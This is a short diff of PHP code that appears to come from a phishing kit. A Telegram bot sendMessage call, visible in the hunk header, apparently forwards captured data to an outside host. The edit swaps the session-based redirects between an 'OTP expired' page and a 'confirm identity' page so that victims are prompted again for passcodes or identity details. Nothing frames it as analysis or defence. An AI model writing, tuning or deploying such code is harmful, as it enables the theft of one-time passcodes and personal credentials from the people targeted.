@@ -14,11 +14,11 @@ file_get_contents("https://api.telegram.org/bot" . $telebot . "/sendMessage?" . 
 @session_start();
 if (isset($_SESSION['first_visit'])) {
    if (isset($_SESSION['second_visit'])) {
-      header("Location: index.php?otp=expired");
+      header("Location: index.php?confirm=identity");
    }
    else {
       $_SESSION['second_visit'] = "Second Visit";
-      header("Location: index.php?confirm=identity");
+      header("Location: index.php?otp=expired");
    }
 }
 else {
